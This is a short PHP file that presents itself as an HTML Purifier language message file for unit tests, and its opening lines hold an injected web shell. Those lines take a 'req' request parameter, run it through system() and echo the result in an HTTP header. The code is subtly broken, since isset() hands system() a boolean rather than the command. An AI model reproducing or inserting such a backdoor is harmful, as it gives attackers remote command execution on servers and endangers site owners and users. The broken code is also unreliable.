<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

// private language message file for unit testing purposes
// this language file has no class associated with it

$fallback = 'en';

$messages = array(
    'HTMLPurifier' => 'HTML Purifier XNone'
);

// vim: et sw=4 sts=4
